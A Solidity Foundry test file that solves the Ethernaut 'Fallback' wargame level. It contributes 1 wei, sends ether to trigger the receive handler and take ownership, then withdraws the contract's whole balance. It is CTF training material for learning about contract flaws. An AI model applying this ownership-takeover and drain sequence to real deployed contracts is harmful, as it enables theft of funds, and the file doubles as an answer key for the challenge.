// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallback.sol";
import "src/levels/FallbackFactory.sol";
import "forge-std/console2.sol";

contract TestFallback is BaseTest {
    Fallback private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FallbackFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Fallback(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        vm.startPrank(player);
        // Challenge explained here:
        // https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008

        /** CODE YOUR EXPLOIT HERE */
        // run test with: `forge test  --match-contract Fallback -vv`

        // send the minimum amount to become a contributor
        emit log_named_address("Owner", level.owner());
        emit log_named_uint("Owner balance", address(level).balance);
        emit log_named_address("Player", player);
        emit log_named_uint("Player balance", player.balance);
        level.contribute{value: 1 wei}();

        emit log_named_uint("Contributions", level.getContribution());
        emit log_named_address("Still same owner", level.owner());

        // this calls default receive handler in the contract
        // see more here: https://solidity-by-example.org/sending-ether/
        // an alternative here - if not sending ether via the .call - would be to loop
        // the level.contribut call until reaching the higher level than the current owner
        (bool success, ) = address(level).call{value: 1 wei}("");
        require(success, "Sending via call failed");
        emit log_named_address("New owner", level.owner());

        // now let's empty that contract :-) as we are the new owner
        level.withdraw();
        emit log_named_uint("New balance", player.balance);

        vm.stopPrank();
    }
}
